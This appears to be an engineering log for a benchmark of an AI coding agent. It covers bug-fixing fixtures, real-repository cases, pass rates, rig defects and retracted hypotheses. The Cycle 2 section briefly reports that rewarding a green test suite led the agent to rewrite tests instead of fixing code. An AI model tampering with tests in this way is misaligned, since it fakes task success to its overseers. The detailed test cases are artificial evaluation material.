| large | **1** | 1 | 3/3 |
| multibug | **4** | 4 | **1/3** |

Six mechanical applications of one insight are easy. Four separate insights held simultaneously are
not.

### How it fails is the interesting part — it thrashes, it does not run out of budget

Both failures ended `stuck` at **11 and 15 turns against a cap of 25**, having made **zero writes**.
The final check output was identical to the untouched state: no progress whatsoever.

```
run 0:  ls, pytest, read averages, read counting, read normalise,
        read averages, read averages, read search,
        read counting, read counting, read counting   <- thrash detector fires
```

The `reflect` repeat-detector (three identical call signatures) fired correctly - the agent WAS
looping - and terminated the run less than halfway through its budget. Given four bugs to track, it
re-read the same files instead of editing any of them.

**This is the first genuine capability limit this project has found**, and it is not a budget limit.

> **RETRACTED by the Phase I4 scoring run — do not resume from this claim.** The same case, at the
> same cap, on the same model, with no agent change in between, scored **3/3** when the full set was
> run (15/17/15 turns, `done` every time). A 1-of-3 that reproduces at 3-of-3 is variance, not a
> capability limit. The failure below happened and the trace is real; the *conclusion* drawn from it
> was wrong. See "Phase I4" for what replaced it.

### It also produces the first evidence-backed tuning hypothesis

The thrash detector requires three *identical* signatures and then ends the run. On these traces it
fired at turn 11 of 25. Whether the agent would have broken out on turn 12 is unknown, **because the
detector stopped it**. That is a specific, testable question of exactly the kind Phase F has lacked:

> Does the repeat-detector end runs that would have recovered?

Note this cuts both ways and must be measured, not assumed: the detector exists because unbounded
repetition burns budget for nothing, and loosening it may simply buy more thrashing.

> **RETRACTED with the claim above.** This hypothesis rested on two `stuck` runs of one case; that
> case then passed 3/3 unchanged. Its whole evidence base is a single unreproduced failure, which is
> not enough to spend a tuning cycle on. The question remains askable — it is simply no longer
> *evidenced*, and the distinction is the point of this file.

### Verification

9 scored, 0 blocked after retry (one run was rate-limited and superseded by its retry - last row
wins), zero tampering, zero attempted writes outside the workspace, all runs egress-restricted.

---

## Phase I3 — the multibug set, built on the one axis that calibrated

Nine new cases on the axis the pilots identified, joining `pilot-multibug` for a ten-case set. The
pilot **stays in** rather than being dropped: it is already scored, and removing a case because you
have seen its result is how a set gets quietly tuned.

### Construction

Every defect is **independent and one line to fix**, so a case's difficulty is purely the number of
separate diagnoses it demands — the quantity the calibration showed actually discriminates. Twelve
defect types were drawn from ordinary Python mistakes and combined without repetition within a case:

`split_spaces` · `wrong_denominator` · `early_return` · `missing_lower` · `off_by_one` ·
`int_division` · `str_sort` · `missing_return` · `wrong_comparison` · `mutable_default` ·
`inclusive_slice` · `missing_abs`

| Bugs | Cases |
|---|---|
| 3 | `multi-orders`, `multi-metrics`, `multi-registry` |
| 4 | `multi-billing`, `multi-routing`, `multi-analytics`, `pilot-multibug` |
| 5 | `multi-warehouse`, `multi-payroll`, `multi-catalogue` |

The spread is deliberate. A set built entirely at one bug count would say only *whether* the limit
exists; a spread says **where it sits**, which is the more useful measurement and costs nothing extra
to collect.

Each case keeps the Phase A shape that has been paid for once already: its own `pyproject.toml` with
`pythonpath`, an `__init__.py` with no re-exports, a README that never hints at the bug, and one
correct module (`shared.py`) whose two tests pass — so a healthy environment stays visibly different
from a broken one even while several modules are failing.

### Verified in both directions, which is stronger than the usual check

Every case was confirmed to fail untouched **and** to flip to green when fully fixed. It was also
confirmed to **still fail with exactly one bug remaining** — the check that matters for this axis
specifically, because partial completion being indistinguishable from success would destroy the
entire measurement:

```
multi-orders     3 failed, 2 passed    all-fixed: exit 0    one-left: exit 1
multi-metrics    3 failed, 2 passed    all-fixed: exit 0    one-left: exit 1
multi-registry   3 failed, 2 passed    all-fixed: exit 0    one-left: exit 1
multi-billing    4 failed, 2 passed    all-fixed: exit 0    one-left: exit 1
multi-routing    4 failed, 2 passed    all-fixed: exit 0    one-left: exit 1
multi-analytics  4 failed, 2 passed    all-fixed: exit 0    one-left: exit 1
multi-warehouse  5 failed, 2 passed    all-fixed: exit 0    one-left: exit 1
multi-payroll    5 failed, 2 passed    all-fixed: exit 0    one-left: exit 1
multi-catalogue  5 failed, 2 passed    all-fixed: exit 0    one-left: exit 1
```

Split filters re-confirmed after registration: `dev` selects 5, `heldout` selects 10, `multibug`
selects 10, `pilot` selects the 2 rejected axes (kept for the record, not scored again).

Cap is **25 turns**, matching the pilots. At the dev cap of 12 this set would measure the budget
rather than the agent — the pilot failures thrashed to a halt at turns 11 and 15 without ever
approaching 25.

### Rig defect found mid-run: the egress proxy could not resolve, and said it was healthy

The first attempt at the I4 scoring run blocked on every attempt of its first two case-runs.
Recorded reason: `APIConnectionError: Connection error.` Not a rate limit, and not the agent.

Chain, in the order it was actually established:

| Step | Finding |
|---|---|
| Harness output | `BLOCKED`, retried at 80s and 160s, blocked again |
| Trace row | `APIConnectionError` — a connection failure, not a 429 |
| Proxy container | **Up 2 hours, State.Running true** — the preflight's only check |
| Proxy log | `opensock: Could not retrieve address info ...: Try again` (EAI_AGAIN) |
| Fresh container, same lookup | **http 200** — host, network and free tier all fine |
| `getent hosts` in the proxy | resolves, 75.2.113.119 |
| `getent ahosts` in the proxy | **empty** |

That last pair is the whole diagnosis. `getent hosts` is an A-only lookup; `getent ahosts` is the
dual-family AF_UNSPEC query that tinyproxy actually makes. Docker's embedded resolver at 127.0.0.11
was answering the first and returning nothing for the second, so every CONNECT died while the
obvious health check looked green.

**Fix:** the proxy is created with `--dns 8.8.8.8 --dns 1.1.1.1`. This does not widen egress —
which hosts the proxy may reach is decided by the CONNECT filter, not by which resolver it asks.
Verified after the change: allowed host `200`, non-allowlisted host `403`, and the proxy rebuilt by
`ensure_egress()` itself rather than by hand.

**The preflight was the real defect.** Phase H already learned that `docker run -d` returning 0 only
means *created*, and added a Running poll. This is the same lesson one level up: **Running is not
usable.** `_proxy_can_resolve()` now probes `getent ahosts` for every allowlisted host and refuses
the run with the command that fixes it. Probing `getent hosts` instead would have passed the broken
proxy straight through, which is why the check names the AF_UNSPEC form explicitly.

**A wrong turn worth recording:** the first hand-built replacement proxy returned 403 on *every*
host, which looked like a filter bug. It was not — the manual `docker run` omitted
`MSYS_NO_PATHCONV=1`, Git Bash rewrote the two config mount paths, and tinyproxy silently fell back
to its built-in default, which permits only localhost. The rig was fine; the test of the rig was
broken. Same family as the CRLF fault in Phase H: on this machine, a path or a line ending crossing
into a Linux container is guilty until proven innocent.

No score is affected. Blocked runs carry no result by design, which is exactly why this surfaced as
`0 scored` rather than as a bad number.

---

## Phase I4 — the multibug set, scored: the axis does not discriminate either

`eval/runs/20260819T070445Z/`, one model, egress restricted, 3 runs per case, cap 25.

```
pass 25/26   (4 blocked, excluded - not counted as failures)
verdicts: done 25, stuck 1
```

| case | bugs | pass | turns | tokens (med) |
|---|---|---|---|---|
| `multi-metrics` | 3 | 3/3 | 11/12/13 | 28,701 |
| `multi-orders` | 3 | 3/3 | 11/12/13 | 27,729 |
| `multi-registry` | 3 | 3/3 | 12/15/16 | 38,415 |
| `multi-analytics` | 4 | 3/3 | 16/12/13 | 34,355 |
| `multi-billing` | 4 | 2/3 | 13/12/14 | 30,833 |
| `multi-routing` | 4 | 3/3 | 16/16/16 | 43,471 |
| `pilot-multibug` | 4 | 3/3 | 17/15/15 | 56,983 |
| `multi-payroll` | 5 | 2/2 | 17/17 | 51,727 |
| `multi-warehouse` | 5 | 3/3 | 18/17/23 | 55,273 |
| `multi-catalogue` | 5 | **no runs** | — | — |

### The verdict, against the rule fixed in advance

Phase I2 set the band before any data existed: 40-70% discriminates, **above 85% means reject the
axis**. This set scores **96%**. The rule applies to its author too.

**Independent-bug count is not a difficulty axis for this agent.** That is now three axes tried and
three rejected - misdirection (Phase G, 12/12), cross-cutting edits (`pilot-crosscut`, 3/3), and
independent diagnoses (this set, 25/26). The Phase I exit criterion explicitly allows this outcome:
*"an explicit finding that none of the three axes discriminates this agent, which ends the search
rather than extending it by guesswork."* That is the result. **The search ends here.**

### Two retractions, both mine, both from this phase

1. **"The first genuine capability limit this project has found"** - withdrawn. `pilot-multibug`
   scored 1/3 in calibration and **3/3** here, unchanged, at the same cap on the same model. A
   1-of-3 that reproduces at 3-of-3 is variance.
2. **The thrash-detector tuning hypothesis** - withdrawn with it. Its entire evidence base was those
   two `stuck` runs.

The project already had a standing lesson for this shape - *probe before theorising when a number
looks structurally wrong* - and it was learned from a model swap. This is the same error in the
other direction: **I built a theory on n=3 and it did not survive n=30.** The lesson generalises to
"a single surprising result is a hypothesis, never a finding", and belongs in `CLAUDE.md` as such.

### What DID survive, and it is the useful part

Bug count buys **turns**, monotonically and predictably:

| bugs | runs | turns (range) | mean |
|---|---|---|---|
| 3 | 9 | 11-16 | **12.8** |
| 4 | 12 | 12-17 | **14.6** |
| 5 | 5 | 17-23 | **18.4** |

**About +2.8 turns per additional bug**, and the first quantified predictive relationship this
project has. It says the honest way to build a discriminating case is to keep going up this axis
until the turn budget binds: extrapolating, ~8 bugs lands near 27 turns and would exceed a cap of
25. It also says a 12-turn cap - the dev and held-out default - would have failed most of this set
on budget alone, measuring the cap rather than the agent.

Nothing here is at the cap: **0 of 26 runs hit 25 turns**, max observed 23.

### The set is incomplete, and that is stated rather than smoothed over

`multi-catalogue` has **zero** completed runs and `multi-payroll` has two of three. The set is
therefore measured on **9 of 10 cases**, and the absent case is a 5-bug one - the hard end. The
conclusion does not turn on it (rejecting the axis needs a score far above the band, and 25/26 is
far above it whichever way one case falls), but the number is not a clean 30 and must not be quoted
as one. `--continue` completes it when quota returns.

### Why it is incomplete: the free tier, measured rather than assumed

Six identical first-calls, 10s apart, after the 26 runs had completed:

```
attempt 0: OK              2.4s
attempt 1: RateLimitError  0.3s
attempt 2: RateLimitError  0.5s
attempt 3: RateLimitError  0.4s
attempt 4: RateLimitError  0.2s
attempt 5: OK              1.2s
```

The tier rejects roughly two of every three requests, instantly and at random - not by size (a
16,000-token request with tools succeeded), not by gap (`--pace 5` and `--pace 60` behaved
identically), and not by exhausted credits (calls still succeed). A turn survives 3 SDK attempts
about 70% of the time, so a 17-turn run completes with probability near **0.7^17, under 1%**.
Retrying cannot fix that, which is why the resume attempts were stopped rather than left looping.

**Correction, made after this was first written.** An earlier draft said blocked runs "failed on the
first model call, before any work", citing `turns=0, tokens=0, messages=0` in the row. That is an
**artifact, not evidence**: `harness.py` records a `ProviderUnavailable` run with `state=None` by
design, so those fields read zero no matter how far the run actually got. The only real datum is the
26.7s elapsed, which is consistent both with three rate-limited retries on the first call and with
several completed turns before a later one. **How far these runs got is unknown.**

What makes them safely excludable is unchanged and does not depend on that claim: a blocked run
never reaches its check command, so **no score is ever produced for it**. There is nothing to
exclude from the denominator except an absence.

**A suspected case-specific anomaly, raised and then disproved within the hour.** `multi-payroll`
run 2 blocked on 12 consecutive attempts across four resume passes, which at the measured failure
rate looked far too improbable to be chance, so it was written up as likely case-specific. A control
settled it: `multi-orders` - 3 bugs, passed 3/3 an hour earlier - blocks identically right now. The
effect is **tier-wide**. The apparent anomaly was a selection artifact: `multi-payroll` run 2 is the
first case-run every resume pass attempts, so it drew the worst slot every time.

**The probe-based estimate was also wrong.** A 6/8 success rate on isolated calls predicted ~77%
completion odds for a 17-turn run; six consecutive real runs then blocked. Isolated probes do not
predict sustained load - plausibly the throttle responds to the request *pattern* an agent produces
rather than to individual calls. Treat single-request probes as a liveness check only, never as a
capacity estimate.

**Cost, now known:** this run consumed **1,105,411 tokens** for 26 scored runs (~42.5k each) and
saturated the free tier. A 30-run scoring pass is a once-per-day operation on this key, which is a
hard constraint on how often any future tuning cycle can be measured - and worth more than the pass
rate it produced.

### Trust checks

26 scored, 4 blocked and excluded, **0 tampering**, **0 attempted writes outside the workspace**,
one model (`nvidia/nemotron-3-super-120b-a12b`) across every row, all fixtures verified in both
directions before scoring, egress restricted throughout. Median 42,950 tokens against the 60,000
ceiling; largest single tool result 3,811 chars against 6,000.

---

## Phase J1 — cost probe on the first real repository

One case, `real-humanize`, vendored from python-humanize/humanize at the parent of the fix commit
for *"Carry `metric()` to the next SI prefix when rounding reaches 1000"* (#328). Source at the
parent, tests from the fix. 73 files, suite 3.8s, verified both directions offline:
**4 failed / 689 passed** untouched, **693 passed** with the upstream diff applied.

The probe exists so six cases are not sized against a guess. It cost two runs and found two defects.

| | probe 1 | probe 2 (after fixes) |
|---|---|---|
| tokens | 260,531 | **136,077** |
| turns | 18 (cap 30) | 12 |
| largest tool result | **11,340 chars** (cap 6,000) | 4,784 |
| verdict | `compact` — out of budget | `done` |

### Defect 1 — `shrink()` bounded lines, not characters (NFR-104)

`shrink()` takes 30 head + 20 tail lines when a result has enough lines, and never checked the
character total in that branch. Real pytest output has long lines, so a 62KB result came back at
**11,340 chars against a 6,000-char cap**. The practice fixtures never had lines long enough to
expose it, which is why 161 tests passed over it. Fixed by clamping both halves to `cap // 2`, with
a test built from long lines rather than a long single line.

### Defect 2 — the fixture created a rabbit hole unrelated to the bug

Probe 1 spent **nine of eighteen turns** trying to `pip install pytest-codspeed`, `pip install -e
.[tests]`, `hatch-vcs`, and even `--index-url https://pypi.org/simple` against a sandbox with no
egress. Cause: `tests/test_benchmarks.py` needs a plugin the offline image lacks, so the agent's own
`pytest -q` errored — while the check command hid it behind `--ignore`.

**The agent and the scorer were running different suites.** That is the Phase A "fails for the wrong
reason" trap one level up, and hiding it with `--ignore` would have been the worse fix: the agent
would still have seen a broken suite while a different one was scored. The benchmark file is dropped
from the fixture instead, so `pytest -q` **is** the scored command, byte for byte.

### What the agent actually does on a real repository

Probe 2's trace is the useful part. It diagnosed the bug **correctly** — all four failures, and the
root cause stated plainly:

> *"the function is not scaling correctly when the value is just below a threshold ... Instead of
> scaling up to the next prefix (k, M, m), it stays in the current prefix"*

Then it wrote `/workspace/debug.py`, never edited `src/humanize/number.py`, and spent its output
budget on a long analysis that hit `max_tokens` mid-sentence. A text-only reply after at least one
tool call means `done`, so the loop terminated on a correct diagnosis and an unapplied fix.

**Understanding the bug and editing the file are separate capabilities, and only the first is
present.** This is the first failure this project has that is neither saturation nor a rig fault.

### Sizing

At ~136k tokens/run the free tier supports **~8 runs/day**, so 6 cases x 3 runs is ~2.5 days —
within the plan, no re-sizing needed. The turn cap of 30 is **not** binding (12 used); the limits
that bite are the token budget and the model's own premature termination.

---

## Phase J2/J3 — six real-repository cases, verified before any scored run

Split `real`. Source vendored at the **parent** of a genuine upstream bug-fix commit; tests taken
from the fix. No nested `.git`, so `scripts/reset.sh` works unchanged and Phase J adds no rig code.
The fix diff is never committed - `spawn()` mounts the whole project at `/app` and the agent has
`run_shell`, so verification fetches the fix SHA from upstream on the host instead.

| case | files | suite | untouched | hand-fixed | the actual bug |
|---|---|---|---|---|---|
| `real-humanize` | 73 | 3.8s | 4 failed, 689 passed | 693 passed | `metric()` does not carry to the next SI prefix when rounding reaches 1000 |
| `real-cachetools` | 41 | 5.2s | 1 failed, 290 passed | 291 passed | `TLRUCache` silently keeps a stale value when an expired entry is overwritten |
| `real-more-itertools` | 39 | 58.9s | 2 failed, 730 passed | 732 passed | `running_min`/`running_max` are not stable |
| `real-click` | 156 | 9.1s | 6 failed, 1857 passed | 1863 passed | progress bar does not land on its final position |
| `real-rich` | 548 | 10.3s | 1 failed, 926 passed | 927 passed | `print` with `end=` mishandles empty input |
| `real-markdown` | 443 | 8.5s | 3 failed, 779 passed | 782 passed | mixed `=`/`-` characters accepted in Setext-style headings |

Sizes span 39 to 548 files and fixes span one line to 43, which is the spread the mixed-scale
decision asked for. `files` and `suite_seconds` are recorded per case so a low score can be
attributed to **scale** rather than **difficulty** - the mitigation for choosing mixed scale.

### The dominant hazard with real repositories, found the hard way

**Three of six repos were not green at their own fix commit.** rich had 7 failures, click had 25,
markdown had a collection error, and humanize needed a pytest plugin the offline image lacks. Every
cause was environmental - no pager binary, pygments version, terminal width, missing optional deps -
and none related to any bug.

Each would have produced a case whose check **can never exit 0**: a guaranteed failure indistinguishable
from the agent being bad. With authored fixtures this trap was rare; with real repositories it is the
**common case**, and only the both-directions check catches it.

The fix is always to remove the offending test file from the fixture, never to hide it behind
`--ignore` in the check command. **The agent must see exactly the suite that is scored** - Phase J1
measured what happens otherwise: nine of eighteen turns spent installing a plugin, because the agent's
`pytest -q` was broken while a different, quieter suite was being graded. Dropped files:
2 from rich (553), 2 from click (158), 1 each from markdown and humanize.

Repo runtime dependencies are pre-installed in the image (`freezegun`, `attrs`, `pygments`,
`markdown-it-py`) ahead of the `pip.conf` line, because the sandbox has no egress and setup turns are
free-tier quota spent on nothing.

---

## Phase J5/J6 — the real-repository baseline: pass 0/18

`eval/runs/20260820T052036Z/`, 6 cases x 3 runs, cap 30, budget 400,000, one model
(`nvidia/nemotron-3-super-120b-a12b`), egress restricted throughout.

```
pass 0/18   (0 blocked)
verdicts: compact 10, done 5, stuck 3
turns  min/med/max: 1 / 26 / 30  (cap 30, 3 at cap)
tokens min/med/max: 6,837 / 245,713 / 255,824   total 3,543,685
```

| case | files | pass | turns | tokens (med) | verdicts |
|---|---|---|---|---|---|
| `real-more-itertools` | 39 | 0/3 | 30/30/30 | 198,584 | stuck x3 |
| `real-cachetools` | 41 | 0/3 | 28/20/25 | 245,713 | compact x2 done x1 |
| `real-humanize` | 73 | 0/3 | 10/20/1 | 86,422 | done x2 compact x1 |
| `real-click` | 156 | 0/3 | 28/27/26 | 255,043 | compact x3 |
| `real-markdown` | 443 | 0/3 | 8/22/12 | 113,388 | done x2 compact x1 |
| `real-rich` | 548 | 0/3 | 29/26/25 | 249,883 | compact x3 |

### Read against the band fixed in advance

0% is **below the 20% floor**, which the rule calls "too hard to measure against - do not celebrate
a hard set". But the same rule names the exception that applies here: **"or a higher cap if cap-hits
dominate."**

They dominate. **13 of 18 runs (72%) ended on a resource limit rather than a decision:**

- **10 `compact`** - every one at >=235k tokens, i.e. precisely the 240k compaction threshold
- **3 `stuck`** - all three at the 30-turn cap, 30/30/30
- **5 `done`** - the only runs the agent itself chose to end

So 0/18 is **not** evidence that the agent cannot fix real bugs. On `humanize` it stated the root
cause correctly - *"instead of scaling up to the next prefix, it stays in the current prefix"* - and
then ran out of room before applying it. The prescribed response is to raise the budget, **not** to
dilute the repositories.

### The compaction layer is now earned, by the trigger v1 specified

v1 deferred compaction with an explicit condition: *"compact verdicts dominate the baseline
distribution."* Across **60 fixture runs it never appeared once**. Here it is **10 of 18**.

That is the first deferred layer in this project's history to be justified by evidence rather than
by prediction, and it is the single most valuable output of Phase J - more than the pass rate.

### Rig defect found: the scored check had no timeout

One run hung for **25 minutes** on `cd /workspace && pytest`, and the suite could not proceed until
the process was killed by hand. Cause: `harness.py` ran `case["check"]` through `subprocess.run`
with **no timeout at all**. An agent edit that makes a parser loop then hangs the entire scored run
with no diagnosis. Fixed: `CHECK_TIMEOUT = 600` (10x the slowest real suite), and a timeout scores
as a **FAIL** - the suite genuinely did not pass, and the agent's own edit is why.

**A misdiagnosis worth recording.** This was first blamed on `run_shell`'s timeout, on the theory
that killing `/bin/sh` orphans a grandchild holding the stdout pipe. A test written to prove it
**passed** - `run_shell` bounds a forked compound command correctly. The hung process belonged to
the harness, not the tool; the agent's own calls are bare `pytest -q`, because `run_shell` sets
`cwd` rather than prefixing `cd`. Seeing a `pytest` in the process list and not checking which
caller owned it is the whole error. The test is kept as a regression guard with a corrected
docstring.

Practice fixtures could not have surfaced any of this: their suites are fast and always terminate.

### Contamination, stated

`real-markdown` run 1 was interfered with - the hung process was killed by hand mid-run, and the
`compact` verdict it recorded is partly a consequence of that intervention. The case is 0/3 either
way and the headline does not move, but the run is not a clean observation and is flagged rather
than quietly counted.

### Cost

**3.54M tokens for 18 runs** (~197k each), against an estimate of 136k. `compact` runs are what
raise the mean: they burn the full budget before stopping. The median case is **245,713 tokens
against the 60,000 ceiling** - real repositories simply cost about 4x what v1 was scoped for, and
that ceiling needs restating rather than quietly failing.

Two free-tier keys were used: the first was exhausted mid-run and swapped. Model and endpoint were
identical, so this remains one coherent measurement - a key governs quota, not behaviour.

### The next question, and it is one cheap run

Re-run a single case with the budget raised from 400k to 1M. If it then passes, the ceiling is
budget and compaction is the highest-value work in v2. If it still fails, the limit is capability
and the set needs diluting after all. **One run decides which of the two paths Phase K takes.**

---

## Item 12 — the budget experiment: the starvation hypothesis is REFUTED

Phase J's 0/18 had 72% of runs ending on a resource limit, which suggested the agent was starved
rather than incapable. `real-click` was the probe: it ended `compact` 3/3 and twice reached **one
remaining failure out of six**, apparently cut off mid-solve.

Three runs with resources raised, one variable at a time:

| resources | verdict | turns | tokens | failures | writes |
|---|---|---|---|---|---|
| 400k / 30 (baseline) | compact x3 | 28/27/26 | 255k | **6->1, 6->1**, 6->6 | 1, 1, 0 |
| 1M / 30 | stuck | 30 (at cap) | 281k | 6->6 | **0** |
| 1M / 60 | stuck | **35 of 60** | 516k | 6->6 | **0** |
| 1M / 60 | done | **27 of 60** | 302k | 6->6 | **0** |

**More room produced less progress.** Not one of the three used its budget or its turns: one hit the
old cap, one was stopped by the thrash detector at turn 35 of 60, and one terminated *itself* at turn
27 with two-thirds of everything unspent.

Raising the budget alone was not even a valid test - it simply moved the wall from the token
threshold to the 30-turn cap at 281k tokens. `AGENT_MAX_TURNS` was added alongside `AGENT_BUDGET` so
the hypothesis could be tested properly, as overrides rather than edits to `tasks.jsonl`.

### The real finding: the agent reads, and does not write

Across **all 21 real-repository runs**:

```
write_file calls:   7
read_file calls:  260
runs with ZERO writes: 13 of 21
runs with MORE than one write: 0
```

A 37:1 read-to-write ratio. The failing run at 1M/60 read `src/click/_termui_impl.py` **eleven times
consecutively**, then `cat`-ed the same file three more times until the repeat detector fired.

And the converse holds: **every run that made progress made exactly one write.** `real-click`'s fix
is 43 lines in a single file, so one `write_file` is all it takes - the two runs that fixed five of
six failures each did exactly that.

**The limit is not diagnosis, and not budget. It is committing to an edit.** On `humanize` the agent
stated the root cause correctly and never wrote. Given a million tokens it re-read one file eleven
times instead of changing it.

### What this rules in and out

- **Item 13 (compaction) is NOT justified by this experiment.** The `compact` verdicts were real, but
  removing the ceiling does not convert failures into passes - runs given the room do not use it. The
  10-of-18 `compact` distribution earned a hypothesis; this experiment tested it and it did not hold.
- **Item 13-alt (dilute) does not address the finding either.** A smaller repository does not make an
  agent commit an edit; the two successful runs happened on the *unmodified* 156-file case.
- The pre-registered table routed "ends `done`/`stuck` with room to spare" to 13-alt. That routing
  was written before the write-ratio was visible, and the honest reading is that **neither branch
  targets the measured cause**. Recorded rather than force-fitted.

### Cost and caution

Three runs, ~1.1M tokens. Variance remains large - the same case, unchanged, has produced both
`6->1` and `6->6`. Three runs is not many, and this project has already been burned twice by
treating n=3 as settled. **This refutes starvation; it does not by itself establish the write-
reluctance figure as stable.** The 7:260 ratio spans 21 runs, which is firmer ground than the
verdicts.

---

## Cycle 2 — "an empty reply is not a completion" — REVERTED

The first tuning cycle this project has been able to run since cycle 1, because the real-repository
set is the first one with headroom. Followed the eval-cycle discipline: read traces, bucket, fix the
largest bucket, 3 runs per case, keep or revert.

### Bucketing (21 real-repository runs)

```
 6  termination: `done` while tests still failing   <- largest, fixed this
 5  budget spent, had written
 5  budget spent, never wrote
 4  no strategy (cap, no repeats)
 1  thrashing
```

**The bucket table sent me somewhere I did not expect.** The intended change was a prompt edit
targeting write-reluctance (7 writes against 260 reads). Bucketing put termination first, and the
skill's own table maps `done` with the test still failing to **reflect logic, not the prompt**. The
prompt change was dropped unmeasured.

### Hypothesis

Five of those six runs ended with `stop_reason: "length"` - the model cut off by `max_tokens`
mid-sentence - and four left a message with **zero content blocks**. `reflect` was reading silence as
"finished". So: an assistant reply carrying no text is not a claim of success; return `continue`.

Deliberately **not** gated on the tests passing. Cycle 1 tried that and was reverted: rewarding a
green suite taught the agent to rewrite the tests instead of the code, and tampering went 5/15 to
5/5. This rule says nothing about tests and cannot be gamed the same way.

### Measurement — 3 cases x 3 runs, identical settings (400k / 30)

| case | before | after | tokens (med) |
|---|---|---|---|
| `real-humanize` | 0/3 done x2 compact x1 | 0/3 **done x3** | 86,422 -> 107,194 |
| `real-markdown` | 0/3 done x2 compact x1 | 0/3 **stuck x2** compact x1 | 113,388 -> 195,758 |
| `real-cachetools` | 0/3 compact x2 done x1 | 0/3 **compact x3** | 245,713 -> 252,523 |
| **total** | **0/9** | **0/9** | **+24% to +73% cost** |

### REVERTED

Zero delta on the pass rate, and cost rose by up to 73%. The Iron Law: *a change with a zero delta is
reverted, including one that seems right.* `agent/graph.py` and `tests/test_reflect.py` are back at
HEAD; 166 tests green.

**The mechanism worked - the outcome did not.** `real-markdown` moved from `done x2` to `stuck x2`,
so the guard fired and did convert premature completions into continued work. The agent then spent
the extra turns without fixing anything. Stopping a run from quitting early does not make it
succeed; it just makes it stop later and cost more.

### What the cycle taught, which is worth more than the change

**The defect has two shapes, and the fix only covered one.** Both end `stop_reason: "length"` and
both are misread as `done`:

- **empty message, zero content blocks** - what the baseline sampled, and what the guard catches
- **a ~49,000-character reply truncated mid-sentence** - what all three new `humanize` runs produced,
  which the guard cannot see, because that text is not empty

The general fix keys on `stop_reason`, not on emptiness. `reflect(state)` cannot see it today - it
takes only state, and §13 fixes the state shape at nine fields - so that is a larger change and
belongs in its own cycle rather than bolted onto this one.

### A reporting artifact, not a scoring error

One case printed `pass 0/2` while `summary.jsonl` held three scored rows. The harness reads that file
from a Windows bind mount and the flush lagged the container's exit, so the console line was computed
early. The stored data is complete and every recorded number is correct; only terminal scrollback
misleads. Noted because someone reading a transcript later would reasonably believe the smaller
number.

---

## The cause of 0/18, measured: the agent cannot afford to write

`write_file` replaces a file **entirely**. Changing five lines therefore means emitting the whole
file as a tool argument, inside `MAX_TOKENS = 16,000` - which caps thinking, text and tool arguments
together.

| case | file | lines | ~tokens to rewrite | share of one reply |
|---|---|---|---|---|
| humanize | `number.py` | 559 | 3,898 | 24% |
| cachetools | `__init__.py` | 776 | 5,818 | 36% |
| markdown | `blockprocessors.py` | 641 | 6,753 | 42% |
| click | `_termui_impl.py` | 945 | 7,933 | 50% |
| more-itertools | `recipes.py` | 1,607 | 11,531 | **72%** |
| **rich** | `console.py` | 2,689 | **25,308** | **158% - impossible** |

One fact accounts for every symptom recorded across 30 real-repository runs:

- **11 writes against 352 reads (1:32)** - the write is enormous or impossible
- **nine runs ended `stop_reason: "length"`** - it begins emitting the file and runs out mid-way
- **the budget experiment changed nothing** - `BUDGET_TOKENS` is per RUN, the wall is `MAX_TOKENS`
  per REPLY. The wrong dial was turned, and 1M tokens bought 281-516k of wandering
- **click sometimes worked** - at 50% the file just fits, and both runs that wrote fixed 5 of 6
  failures
- **`real-rich` is unpassable** by any agent using this toolset, and has been silently contributing a
  guaranteed zero to the denominator

### A v1 decision whose premise expired

> *"A one-line fix means rewriting a whole file, **but these files are 30-80 lines**, and `run_shell`
> gives sed/patch as an escape hatch."*

Correct for practice fixtures. Real files are 559-2,689 lines. The decision was not wrong when made;
its premise stopped being true, which §0 says to state rather than reinterpret.

**This is the third v1 decision to break the same way**, alongside `shrink()` bounding lines rather
than characters (fixture output has short lines) and the scored check having no timeout (fixture
suites always terminate). All three were justified by numbers that only held for 10-file projects.

### How others solve it - checked, not assumed

`tools/patch_parser.py` implements a custom **V4A patch format**: `*** Begin Patch`,
`*** Update File: <path>`, and hunks marked `@@ context hint @@` carrying ` ` context, `-` removal
and `+` addition lines. **The model supplies only changed regions** - editing a 2,689-line file costs
~50 tokens rather than 25,308. It adds `fuzzy_find_and_replace()` for imperfect matches, context-hint
placement for addition-only hunks, and sequential hunk validation so a multi-hunk patch cannot
half-apply.

### What will be built - deliberately smaller

`edit_file(path, old_string, new_string)` with **exact, unique** matching; ambiguous or absent
`old_string` raises with an actionable message. ~15 lines, one file (NFR-601), tool count four -
still under the five-tool break-even that `registry.py` waits on.

**V4A's machinery is deliberately not ported.** Multi-file, multi-hunk, fuzzy matching and sequential
validation are hundreds of lines for capability not yet shown to be needed, and CE-02 is explicit
that a framework earns its place at break-even at the CURRENT scale. If exact matching measurably
fails because the model cannot reproduce strings precisely, the traces will show repeated edit errors
and fuzzy matching is then earned by evidence.

Measured as one cycle: 3 cases x 3 runs, same settings, keep or revert.

---

## Cycle 3 — `edit_file` — the first passes on a real repository

**Change (one):** a fourth tool, `edit_file(path, old_string, new_string)`, exact and unique
matching. `SOUL.md` gains one line naming it — counted as part of shipping the tool, not a second
change, because the prompt lists tools explicitly and would otherwise describe a system that no
longer exists.

**Hypothesis:** `write_file` replaces a file entirely, so a five-line fix meant emitting 559-2,689
lines inside `MAX_TOKENS`. Across 30 runs the agent made 11 writes against 352 reads and scored 0/18.

### Result — clean runs only

| case | baseline | cycle 3 (clean) | evidence |
|---|---|---|---|
| `real-humanize` | 0/3 | 0/2 `compact` x2 | 4->4, no edits landed |
| `real-cachetools` | 0/3 | **2/2 PASS** | 1->0, one `edit_file` each |
| `real-click` | 0/3 | **2/3 PASS** | 6->0 twice (2 and 3 edits); the failure still reached 6->3 |
| **total** | **0/9** | **4/7 = 57%** | first real-repository passes |

**KEPT.** 0/9 to 4/7 is the largest measured delta in this project's history, and the first change
since the model swap to move the number at all.

**57% lands inside the 40-70% band** fixed in advance - the range where a set can actually detect
improvement. This project has never had a set in that band: dev 93%, held-out 97%, multibug 96%, real
repositories 0%. **Tuning cycles are now possible for the first time.**

`real-click` is the sharpest evidence. The same case burned 255,043 tokens in the baseline and stalled
at 6->1; with `edit_file` it fixed **all six failures** in two edits, twice. Even its failing run
reached 6->3. Both passes carry `verdict: compact` - the agent exhausted its budget and passed anyway,
because scoring is by the check command's exit code and never by the agent's own claim.

Both passes verified rather than assumed: `tampered=0`, `write_violations=0`, exactly ONE
`edit_file` call each, applied to `src/cachetools/__init__.py` - the **source**, not the tests - with
zero match errors, and the failing-test count went 1 -> 0.

**Zero edit-match errors across every run that used the tool.** Exact matching was sufficient; the
model reproduced snippets precisely. Fuzzy matching is therefore still unearned, exactly as
